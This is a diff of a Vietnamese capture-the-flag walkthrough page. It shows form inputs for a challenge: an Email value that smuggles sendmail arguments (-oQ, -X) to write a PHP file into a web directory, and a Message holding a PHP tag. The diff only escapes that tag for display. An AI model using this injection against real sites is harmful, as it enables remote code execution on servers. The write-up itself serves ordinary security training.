@@ -2,7 +2,7 @@ Vào trang chủ của challange, kéo xuống form điền của phần <strong
 Trong form điền, điền các trường như sau<br/>
 <strong>Name:</strong> 1337 H4X0r <br/>
 <strong>Email:</strong> "attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php  some"@email.com <br/>
-<strong>Message:</strong> <?php phpinfo(); ?><br/>
+<strong>Message:</strong> &lt;?php phpinfo(); ?&gt;<br/>
 <strong>Capcha:</strong> Đã có sẵn</br>
 Tắt <code>type=email</code> thành <code>type=text</code> trong trường <strong>Email</strong><br/>
 Gửi form đi, sẽ có trả về <strong> You are so close ....</strong> và 1 file php<br/>
